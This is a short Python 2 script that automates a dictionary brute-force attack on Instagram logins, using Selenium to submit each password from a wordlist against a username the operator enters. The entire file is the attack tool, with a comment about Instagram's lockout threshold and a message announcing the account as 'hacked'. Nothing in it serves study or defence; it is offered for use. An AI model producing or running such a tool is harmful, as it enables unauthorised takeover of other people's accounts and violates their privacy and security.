__author__ = 'The BlackRose ~~ DOM!NUS'

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import requests
import time
import os
from termcolor import colored

os.system('cls')

driver = webdriver.Chrome('chromedriver.exe')
driver.get('https://www.instagram.com/accounts/login/')
user = raw_input('Enter Username : ')
try:
    f = open('passwords.txt','r')
    passwords = []
    while True:
        line = f.readline()
        if not line:
            break
        passwords.append(line.strip('\n'))
    f.close()
except:
    print colored('Check path of dictionary','blue')

#INSTAGRAM BLOCKS BRUTFORCE ATTACK WHEN 10 TIMES    
def attack_code():
    try:
        for attack_pass in passwords:
            driver.find_element_by_name('username').send_keys(user)            
            driver.find_element_by_name('password').send_keys(attack_pass)
            driver.find_element_by_xpath("//button[@type='submit']").click()
            driver.find_element_by_xpath("//input[@name='username']").send_keys(Keys.CONTROL , 'a')
            driver.find_element_by_xpath("//input[@name='username']").send_keys(Keys.DELETE)
            driver.find_element_by_xpath("//input[@name='password']").send_keys(Keys.CONTROL, 'a')
            driver.find_element_by_xpath("//input[@name='password']").send_keys(Keys.DELETE)
            time.sleep(1)
    except:
        print colored('Account Hacked', 'blue'),colored('or BLOCKED','yellow'),
attack_code()
